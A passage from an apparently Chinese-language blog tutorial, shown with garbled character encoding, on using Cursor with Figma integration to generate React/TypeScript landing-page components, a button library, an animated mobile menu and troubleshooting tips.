        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"absolute top-0 right-0 w-96 h-96 bg-primary-200 rounded-full blur-3xl opacity-20"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"absolute bottom-0 left-0 w-96 h-96 bg-secondary-200 rounded-full blur-3xl opacity-20"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span>
  )
}
</code></pre>
<p>åŒæ—¶ï¼ŒAIè¿˜è´´å¿ƒåœ°ç”Ÿæˆäº†åŠ¨ç”»çš„CSSï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@keyframes</span> fadeIn {
  <span class="hljs-selector-tag">from</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">20px</span>);
  }
  <span class="hljs-selector-tag">to</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>);
  }
}

<span class="hljs-selector-class">.animate-fade-in</span> {
  <span class="hljs-attribute">animation</span>: fadeIn <span class="hljs-number">0.6s</span> ease-out;
}

<span class="hljs-selector-class">.animate-fade-in-delay-1</span> {
  <span class="hljs-attribute">animation</span>: fadeIn <span class="hljs-number">0.6s</span> ease-out <span class="hljs-number">0.2s</span> both;
}

<span class="hljs-selector-class">.animate-fade-in-delay-2</span> {
  <span class="hljs-attribute">animation</span>: fadeIn <span class="hljs-number">0.6s</span> ease-out <span class="hljs-number">0.4s</span> both;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed7dfc836511452386d1584a59e40128~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=oXi9bNBXbDUkS6TuoUV8JRGHqlw%3D" alt="cursor01-saasé¡µé¢heroæˆªå›¾.png" loading="lazy"/></p>
<p><strong>çœ‹åˆ°è¿™é‡Œï¼Œä½ å¯èƒ½ä¼šæƒ³</strong>ï¼šè¿™è¿˜åŸæ•ˆæœ...ä¹Ÿå¤ªå¥½äº†å§ï¼Ÿ</p>
<ul>
<li>âœ… TypeScriptç±»å‹å®Œæ•´</li>
<li>âœ… å“åº”å¼è®¾è®¡ï¼ˆ<code>sm:flex-row</code>ï¼‰</li>
<li>âœ… åŠ¨ç”»æ•ˆæœä¼˜é›…</li>
<li>âœ… HoverçŠ¶æ€ç»†èŠ‚åˆ°ä½</li>
<li>âœ… è¯­ä¹‰åŒ–çš„classå‘½å</li>
<li>âœ… å¯è®¿é—®æ€§è€ƒè™‘ï¼ˆå¯¹æ¯”åº¦ã€æ–‡å­—å¤§å°ï¼‰</li>
</ul>
<p>è¿™å°±æ˜¯AI + è®¾è®¡ç³»ç»Ÿçš„å¨åŠ›ï¼</p>
<h3 data-id="heading-16">æ­¥éª¤4ï¼šæ‰¹é‡ç”Ÿæˆå…¶ä»–ç»„ä»¶</h3>
<p>æœ‰äº†ç¬¬ä¸€ä¸ªç»„ä»¶çš„ç»éªŒï¼Œåé¢å°±æ˜¯å¤åˆ¶ç²˜è´´å¤§æ³•äº†ã€‚</p>
<p>ä½¿ç”¨Cursorçš„Composeræ¨¡å¼ï¼ˆ<code>Cmd/Ctrl + I</code>ï¼‰ï¼Œä¸€æ¬¡æ€§ç”Ÿæˆå¤šä¸ªç»„ä»¶ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">@figma åŸºäºFigmaè®¾è®¡ï¼ŒæŒ‰é¡ºåºç”Ÿæˆä»¥ä¸‹ç»„ä»¶ï¼š

<span class="hljs-bullet">1.</span> Features - åŠŸèƒ½ç‰¹æ€§ç½‘æ ¼
<span class="hljs-bullet">   -</span> 3åˆ—å¸ƒå±€ï¼Œå“åº”å¼ï¼ˆç§»åŠ¨ç«¯1åˆ—ï¼‰
<span class="hljs-bullet">   -</span> æ¯ä¸ªç‰¹æ€§åŒ…å«ï¼šå›¾æ ‡ã€æ ‡é¢˜ã€æè¿°
<span class="hljs-bullet">   -</span> ä½¿ç”¨è®¾è®¡ç³»ç»Ÿçš„spacingå’Œcolors

<span class="hljs-bullet">2.</span> Pricing - ä»·æ ¼è¡¨
<span class="hljs-bullet">   -</span> 3ä¸ªå¥—é¤å¡ç‰‡ï¼šBasicã€Proã€Enterprise
<span class="hljs-bullet">   -</span> åŒ…å«ï¼šä»·æ ¼ã€åŠŸèƒ½åˆ—è¡¨ã€CTAæŒ‰é’®
<span class="hljs-bullet">   -</span> Proå¥—é¤é«˜äº®æ˜¾ç¤º

<span class="hljs-bullet">3.</span> Footer - é¡µè„š
<span class="hljs-bullet">   -</span> Logo + å¯¼èˆªé“¾æ¥ï¼ˆ4åˆ—ï¼‰
<span class="hljs-bullet">   -</span> ç‰ˆæƒä¿¡æ¯å±…ä¸­
<span class="hljs-bullet">   -</span> å“åº”å¼å¸ƒå±€

è¦æ±‚ï¼š
<span class="hljs-bullet">-</span> æ‰€æœ‰ç»„ä»¶ä½¿ç”¨TypeScript
<span class="hljs-bullet">-</span> éµå¾ªè®¾è®¡ç³»ç»Ÿ
<span class="hljs-bullet">-</span> å¯å¤ç”¨çš„ç»„ä»¶ç»“æ„
<span class="hljs-bullet">-</span> æ·»åŠ PropTypesç”¨äºç±»å‹æ£€æŸ¥
</code></pre>
<p>AIä¼šä¾æ¬¡ç”Ÿæˆä¸‰ä¸ªç»„ä»¶ï¼Œæ¯ä¸ªéƒ½å®Œç¾è¿˜åŸè®¾è®¡ç¨¿ã€‚</p>
<p><strong>æƒŠå–œç‚¹3</strong>ï¼šAIä¼šè‡ªåŠ¨å¤„ç†ç»„ä»¶é—´çš„ä¾èµ–å…³ç³»ï¼Œæ¯”å¦‚Pricingç»„ä»¶ä¸­çš„æŒ‰é’®ä¼šå¤ç”¨ä¹‹å‰çš„Buttonç»„ä»¶ã€‚</p>
<h3 data-id="heading-17">æ­¥éª¤5ï¼šå“åº”å¼é€‚é…</h3>
<p>æœ€åä¸€æ­¥ï¼Œè®©æ‰€æœ‰ç»„ä»¶åœ¨ä¸åŒè®¾å¤‡ä¸Šå®Œç¾å±•ç¤ºã€‚</p>
<pre><code class="hljs language-diff" lang="diff">@figma æ£€æŸ¥è®¾è®¡æ–‡ä»¶ä¸­çš„å“åº”å¼æ–­ç‚¹ï¼Œä¸ºæ‰€æœ‰ç»„ä»¶æ·»åŠ é€‚é…

æ–­ç‚¹ï¼š
<span class="hljs-deletion">- ç§»åŠ¨ç«¯ï¼š&lt; 640px</span>
<span class="hljs-deletion">- å¹³æ¿ï¼š640px - 1024px</span>
<span class="hljs-deletion">- æ¡Œé¢ï¼š&gt; 1024px</span>

é‡ç‚¹ä¼˜åŒ–ï¼š
<span class="hljs-deletion">- ç§»åŠ¨ç«¯å¯¼èˆªæŠ˜å </span>
<span class="hljs-deletion">- Featuresç½‘æ ¼ä»3åˆ—å˜1åˆ—</span>
<span class="hljs-deletion">- Pricingå¡ç‰‡å‚ç›´å †å </span>
<span class="hljs-deletion">- å­—å·å’Œé—´è·é€‚å½“ç¼©å°</span>
</code></pre>
<p>AIä¼šè‡ªåŠ¨è°ƒæ•´æ‰€æœ‰ç»„ä»¶çš„å“åº”å¼classã€‚</p>
<p><strong>æƒŠå–œç‚¹4</strong>ï¼šAIèƒ½è¯†åˆ«Figmaä¸­çš„Auto Layoutçº¦æŸï¼Œæ™ºèƒ½è½¬æ¢ä¸ºFlexboxæˆ–Gridå¸ƒå±€ï¼</p>
<h2 data-id="heading-18">è¿›é˜¶æŠ€å·§ï¼šè®©AIæ›´æ‡‚ä½ çš„è®¾è®¡</h2>
<p>åŸºç¡€æµç¨‹èµ°é€šåï¼Œæˆ‘å†åˆ†äº«å‡ ä¸ªé«˜çº§æŠ€å·§ï¼Œè®©Cursoræˆä¸ºä½ çš„"ä¸“å±å‰ç«¯"ã€‚</p>
<h3 data-id="heading-19">æŠ€å·§1ï¼šä¸Šä¼ è®¾è®¡è§„èŒƒæ–‡æ¡£</h3>
<p>å¦‚æœä½ çš„å›¢é˜Ÿæœ‰å®Œæ•´çš„è®¾è®¡è§„èŒƒæ–‡æ¡£ï¼ˆDesign Systemï¼‰ï¼Œå¯ä»¥ä¸Šä¼ åˆ°Cursorï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@docs</span> è¿™æ˜¯æˆ‘ä»¬å›¢é˜Ÿçš„è®¾è®¡è§„èŒƒï¼Œè¯·åœ¨ç”Ÿæˆä»£ç æ—¶ä¸¥æ ¼éµå¾ª

[ä¸Šä¼  design-system.md æ–‡ä»¶]
</code></pre>
<p>æ–‡æ¡£å†…å®¹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># è®¾è®¡ç³»ç»Ÿè§„èŒƒ</span>

<span class="hljs-section">## å‘½åè§„èŒƒ</span>
<span class="hljs-bullet">-</span> ç»„ä»¶æ–‡ä»¶åï¼šPascalCase (å¦‚: HeroSection.tsx)
<span class="hljs-bullet">-</span> CSSç±»åï¼škebab-case (å¦‚: hero-section)
<span class="hljs-bullet">-</span> å˜é‡å‘½åï¼šcamelCase (å¦‚: primaryColor)

<span class="hljs-section">## ç»„ä»¶ç»“æ„</span>
<span class="hljs-bullet">-</span> æ¯ä¸ªç»„ä»¶ç‹¬ç«‹ç›®å½•
<span class="hljs-bullet">-</span> åŒ…å«ï¼šindex.tsxã€styles.module.cssã€types.tsã€README.md

<span class="hljs-section">## ä»£ç è§„èŒƒ</span>
<span class="hljs-bullet">-</span> ä½¿ç”¨å‡½æ•°å¼ç»„ä»¶
<span class="hljs-bullet">-</span> Propsä½¿ç”¨interfaceå®šä¹‰
<span class="hljs-bullet">-</span> å¯¼å‡ºä½¿ç”¨named export
<span class="hljs-bullet">-</span> æ ·å¼ä½¿ç”¨CSS Modules

<span class="hljs-section">## å¯è®¿é—®æ€§è¦æ±‚</span>
<span class="hljs-bullet">-</span> æ‰€æœ‰æŒ‰é’®å¿…é¡»æœ‰aria-label
<span class="hljs-bullet">-</span> å›¾ç‰‡å¿…é¡»æœ‰altå±æ€§
<span class="hljs-bullet">-</span> å¯¹æ¯”åº¦ç¬¦åˆWCAG AAæ ‡å‡†
</code></pre>
<p>ä¸Šä¼ åï¼ŒAIç”Ÿæˆçš„ä»£ç ä¼šè‡ªåŠ¨éµå¾ªä½ çš„è§„èŒƒï¼</p>
<h3 data-id="heading-20">æŠ€å·§2ï¼šè¯†åˆ«è®¾è®¡ä¸­çš„é‡å¤ç»„ä»¶</h3>
<p>è®¾è®¡ç¨¿ä¸­ç»å¸¸æœ‰å¤šå¤„ä½¿ç”¨ç›¸åŒæ ·å¼çš„å…ƒç´ ï¼ŒAIèƒ½è‡ªåŠ¨è¯†åˆ«å¹¶å¤ç”¨ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">@figma åˆ†æè®¾è®¡æ–‡ä»¶ï¼Œè¯†åˆ«æ‰€æœ‰é‡å¤ä½¿ç”¨çš„ç»„ä»¶æ¨¡å¼

åŒ…æ‹¬ï¼š
<span class="hljs-deletion">- æŒ‰é’®æ ·å¼ï¼ˆä¸»æŒ‰é’®ã€æ¬¡è¦æŒ‰é’®ã€æ–‡å­—æŒ‰é’®ï¼‰</span>
<span class="hljs-deletion">- å¡ç‰‡æ ·å¼</span>
<span class="hljs-deletion">- è¾“å…¥æ¡†æ ·å¼</span>
<span class="hljs-deletion">- å›¾æ ‡è§„èŒƒ</span>

ç”Ÿæˆä¸€ä¸ªå¯å¤ç”¨çš„ç»„ä»¶åº“
</code></pre>
<p>AIä¼šç”Ÿæˆç±»ä¼¼è¿™æ ·çš„ç»„ä»¶åº“ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">ButtonVariant</span> = <span class="hljs-string">'primary'</span> | <span class="hljs-string">'secondary'</span> | <span class="hljs-string">'text'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ButtonSize</span> = <span class="hljs-string">'sm'</span> | <span class="hljs-string">'md'</span> | <span class="hljs-string">'lg'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ButtonProps</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-title class_">ButtonHTMLAttributes</span>&lt;<span class="hljs-title class_">HTMLButtonElement</span>&gt; {
  variant?: <span class="hljs-title class_">ButtonVariant</span>
  size?: <span class="hljs-title class_">ButtonSize</span>
  <span class="hljs-attr">children</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">Button</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">ButtonProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{
  variant = <span class="hljs-string">'primary'</span>,
  size = <span class="hljs-string">'md'</span>,
  children,
  className = <span class="hljs-string">''</span>,
  ...props
}</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> baseStyles = <span class="hljs-string">'font-semibold rounded-button transition-all duration-200'</span>

  <span class="hljs-keyword">const</span> variantStyles = {
    <span class="hljs-attr">primary</span>: <span class="hljs-string">'bg-primary-500 text-white hover:bg-primary-600 hover:shadow-card-hover'</span>,
    <span class="hljs-attr">secondary</span>: <span class="hljs-string">'bg-white text-primary-500 border-2 border-primary-500 hover:bg-primary-50'</span>,
    <span class="hljs-attr">text</span>: <span class="hljs-string">'text-primary-500 hover:bg-primary-50'</span>,
  }

  <span class="hljs-keyword">const</span> sizeStyles = {
    <span class="hljs-attr">sm</span>: <span class="hljs-string">'px-4 py-2 text-sm'</span>,
    <span class="hljs-attr">md</span>: <span class="hljs-string">'px-8 py-4 text-base'</span>,
    <span class="hljs-attr">lg</span>: <span class="hljs-string">'px-12 py-6 text-lg'</span>,
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>
      <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">baseStyles</span>} ${<span class="hljs-attr">variantStyles</span>[<span class="hljs-attr">variant</span>]} ${<span class="hljs-attr">sizeStyles</span>[<span class="hljs-attr">size</span>]} ${<span class="hljs-attr">className</span>}`}
      {<span class="hljs-attr">...props</span>}
    &gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  )
}
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ•´ä¸ªé¡¹ç›®çš„æŒ‰é’®éƒ½ç»Ÿä¸€äº†ï¼Œä¿®æ”¹ä¹Ÿæ–¹ä¾¿ï¼</p>
<h3 data-id="heading-21">æŠ€å·§3ï¼šè®¾è®¡Tokenè‡ªåŠ¨åŒæ­¥</h3>
<p>è®¾è®¡å¸ˆæœ€çƒ¦çš„å°±æ˜¯ï¼š"æ”¹ä¸ªé¢œè‰²ï¼Œä½ å¾—æ‰‹åŠ¨æ”¹ä¸€éä»£ç "ã€‚</p>
<p>æœ‰äº†MCPï¼Œè¿™ä¸ªé—®é¢˜ä¸å­˜åœ¨äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨é¡¹ç›®æ ¹ç›®å½•æ‰§è¡Œ</span>
cursor chat <span class="hljs-string">"åŒæ­¥Figmaçš„æœ€æ–°è®¾è®¡Tokenåˆ°tailwind.config.ts"</span>
</code></pre>
<p>AIä¼šå¯¹æ¯”å½“å‰é…ç½®å’ŒFigmaæœ€æ–°æ•°æ®ï¼Œè‡ªåŠ¨æ›´æ–°å˜åŒ–çš„éƒ¨åˆ†ã€‚</p>
<p><strong>å®é™…æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>è®¾è®¡å¸ˆåœ¨Figmaæ”¹äº†ä¸»è‰²ï¼š<code>#3B82F6</code> â†’ <code>#2563EB</code></li>
<li>è¿è¡ŒåŒæ­¥å‘½ä»¤</li>
<li>AIè‡ªåŠ¨æ›´æ–°é…ç½®æ–‡ä»¶</li>
<li>æ•´ä¸ªç½‘ç«™é¢œè‰²ç«‹å³æ›´æ–°</li>
</ul>
<h3 data-id="heading-22">æŠ€å·§4ï¼šå¤„ç†å¤æ‚äº¤äº’å’ŒåŠ¨ç”»</h3>
<p>Figmaçš„PrototypeåŠŸèƒ½å¯ä»¥å®šä¹‰äº¤äº’æµç¨‹ï¼ŒAIä¹Ÿèƒ½ç†è§£ï¼</p>
<pre><code class="hljs language-markdown" lang="markdown">@figma è¿™ä¸ªç§»åŠ¨ç«¯èœå•ç»„ä»¶åœ¨Figmaä¸­æœ‰Prototypeäº¤äº’

äº¤äº’æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> ç‚¹å‡»æ±‰å ¡å›¾æ ‡
<span class="hljs-bullet">2.</span> èœå•ä»å³ä¾§æ»‘å…¥
<span class="hljs-bullet">3.</span> é®ç½©å±‚æ·¡å…¥
<span class="hljs-bullet">4.</span> ç‚¹å‡»é®ç½©æˆ–å…³é—­æŒ‰é’®ï¼Œèœå•æ»‘å‡º

è¯·ç”Ÿæˆå®Œæ•´çš„Reactç»„ä»¶ï¼ŒåŒ…æ‹¬ï¼š
<span class="hljs-bullet">1.</span> çŠ¶æ€ç®¡ç†ï¼ˆuseStateï¼‰
<span class="hljs-bullet">2.</span> åŠ¨ç”»æ•ˆæœï¼ˆFramer Motionï¼‰
<span class="hljs-bullet">3.</span> ç”¨æˆ·äº¤äº’é€»è¾‘
<span class="hljs-bullet">4.</span> é”®ç›˜æ”¯æŒï¼ˆESCå…³é—­ï¼‰
</code></pre>
<p>AIä¼šç”Ÿæˆå¸¦å®Œæ•´åŠ¨ç”»çš„ç§»åŠ¨èœå•ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { motion, <span class="hljs-title class_">AnimatePresence</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'framer-motion'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MobileMenu</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> [isOpen, setIsOpen] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-comment">// ESCé”®å…³é—­èœå•</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEsc</span> = (<span class="hljs-params">e: KeyboardEvent</span>) =&gt; {
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'Escape'</span>) <span class="hljs-title function_">setIsOpen</span>(<span class="hljs-literal">false</span>)
    }
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, handleEsc)
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'keydown'</span>, handleEsc)
  }, [])

  <span class="hljs-comment">// æ‰“å¼€æ—¶ç¦æ­¢èƒŒæ™¯æ»šåŠ¨</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (isOpen) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">'hidden'</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">'unset'</span>
    }
  }, [isOpen])

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {/* æ±‰å ¡å›¾æ ‡ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsOpen(true)}
        className="p-2 md:hidden"
        aria-label="æ‰“å¼€èœå•"
      &gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-6 h-6"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"currentColor"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">strokeLinecap</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">strokeLinejoin</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">strokeWidth</span>=<span class="hljs-string">{2}</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M4 6h16M4 12h16M4 18h16"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

      {/* èœå•å’Œé®ç½© */}
      <span class="hljs-tag">&lt;<span class="hljs-name">AnimatePresence</span>&gt;</span>
        {isOpen &amp;&amp; (
          <span class="hljs-tag">&lt;&gt;</span>
            {/* é®ç½©å±‚ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">motion.div</span>
              <span class="hljs-attr">initial</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">0</span> }}
              <span class="hljs-attr">animate</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">1</span> }}
              <span class="hljs-attr">exit</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">0</span> }}
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsOpen(false)}
              className="fixed inset-0 bg-black/50 z-40"
            /&gt;

            {/* èœå•é¢æ¿ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">motion.div</span>
              <span class="hljs-attr">initial</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">x:</span> '<span class="hljs-attr">100</span>%' }}
              <span class="hljs-attr">animate</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">x:</span> <span class="hljs-attr">0</span> }}
              <span class="hljs-attr">exit</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">x:</span> '<span class="hljs-attr">100</span>%' }}
              <span class="hljs-attr">transition</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">type:</span> '<span class="hljs-attr">tween</span>', <span class="hljs-attr">duration:</span> <span class="hljs-attr">0.3</span> }}
              <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed right-0 top-0 h-full w-80 bg-white z-50 shadow-2xl"</span>
            &gt;</span>
              {/* å…³é—­æŒ‰é’® */}
              <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsOpen(false)}
                className="absolute top-4 right-4 p-2"
                aria-label="å…³é—­èœå•"
              &gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-6 h-6"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"currentColor"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">strokeLinecap</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">strokeLinejoin</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">strokeWidth</span>=<span class="hljs-string">{2}</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M6 18L18 6M6 6l12 12"</span> /&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

              {/* èœå•å†…å®¹ */}
              <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-8 pt-16"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"space-y-4"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg hover:text-primary-500"</span>&gt;</span>é¦–é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg hover:text-primary-500"</span>&gt;</span>åŠŸèƒ½<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg hover:text-primary-500"</span>&gt;</span>ä»·æ ¼<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg hover:text-primary-500"</span>&gt;</span>å…³äº<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">motion.div</span>&gt;</span>
          <span class="hljs-tag">&lt;/&gt;</span>
        )}
      <span class="hljs-tag">&lt;/<span class="hljs-name">AnimatePresence</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}
</code></pre>
<p>**çœ‹åˆ°æ²¡ï¼Ÿ**è¿åŠ¨ç”»ç»†èŠ‚éƒ½è€ƒè™‘åˆ°äº†ï¼š</p>
<ul>
<li>âœ… èƒŒæ™¯æ»šåŠ¨é”å®š</li>
<li>âœ… ESCé”®å…³é—­</li>
<li>âœ… æ— éšœç¢æ ‡ç­¾</li>
<li>âœ… æµç•…çš„åŠ¨ç”»</li>
<li>âœ… ç‚¹å‡»é®ç½©å…³é—­</li>
</ul>
<p>è¿™ä»£ç è´¨é‡ï¼Œèµ„æ·±å‰ç«¯çœ‹äº†éƒ½è¯´å¥½ï¼</p>
<h2 data-id="heading-23">å¸¸è§é—®é¢˜å’Œé¿å‘æŒ‡å—</h2>
<p>å®æˆ˜ä¸­è‚¯å®šä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œæˆ‘æŠŠè¸©è¿‡çš„å‘éƒ½åˆ—å‡ºæ¥äº†ã€‚</p>
<h3 data-id="heading-24">é—®é¢˜1ï¼šTokenæƒé™ä¸è¶³</h3>
<p><strong>ç°è±¡</strong>ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Error:</span> <span class="hljs-number">403</span> Forbidden
Failed <span class="hljs-keyword">to</span> fetch Figma file
</code></pre>
<p><strong>åŸå› </strong>ï¼šTokenæ²¡æœ‰è®¿é—®è¯¥æ–‡ä»¶çš„æƒé™</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>ç¡®è®¤ä½ æ˜¯è¯¥Figmaæ–‡ä»¶çš„æˆå‘˜</li>
<li>é‡æ–°ç”ŸæˆTokenï¼Œç¡®ä¿æœ‰è¯»å–æƒé™</li>
<li>å¦‚æœæ˜¯å›¢é˜Ÿæ–‡ä»¶ï¼Œè”ç³»ç®¡ç†å‘˜æˆæƒ</li>
</ol>
<h3 data-id="heading-25">é—®é¢˜2ï¼šFigmaæ–‡ä»¶å¤ªå¤§å¯¼è‡´è¶…æ—¶</h3>
<p><strong>ç°è±¡</strong>ï¼šAIå“åº”å¾ˆæ…¢ï¼Œæˆ–è€…ç›´æ¥è¶…æ—¶</p>
